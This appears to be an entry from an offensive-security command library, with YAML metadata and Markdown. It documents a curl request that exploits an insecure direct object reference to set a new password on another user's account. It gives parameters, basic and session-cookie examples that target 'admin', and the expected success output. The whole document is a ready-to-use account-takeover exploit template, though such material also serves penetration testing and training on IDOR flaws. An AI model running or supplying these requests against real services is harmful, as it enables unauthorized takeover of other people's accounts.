---
type: command
executor: bash
data: >-
  curl -X POST "http://foo.bar/changepassword" -d
  "user=$_TARGET_USER_ID&newpassword=$_NEW_PASSWORD" -v
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - idor
  - exploit
verified: true
validated: true
---

# curl-change-password-for-user

## Command

```bash
curl -X POST "http://foo.bar/changepassword" -d "user=$_TARGET_USER_ID&newpassword=$_NEW_PASSWORD" -v
```

## Description

This command sends a POST request to a password change endpoint, using a manipulated user ID to alter another account's password, exploiting IDOR for unauthorized modifications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_USER_ID | The username or ID of the target user | Yes |
| $_NEW_PASSWORD | The new password to set | Yes |
| -X POST | Specifies HTTP POST method | Built-in |
| -d | Data to send in the request body | Built-in |
| -v | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl -X POST "http://foo.bar/changepassword" -d "user=admin&newpassword=weakpass" -v
```

### Advanced Usage

```bash
curl -X POST "http://foo.bar/changepassword" -d "user=admin&newpassword=weakpass" -H "Cookie: session=abc123" -v
```

## Expected Output

On success, a confirmation message like "Password changed successfully" with HTTP 200 or 302 redirect. Example:

```
< HTTP/1.1 200 OK
...
Password updated for user: admin
```

## Related

- [[procedures/Exploit-Insecure-Direct-Object-References]]
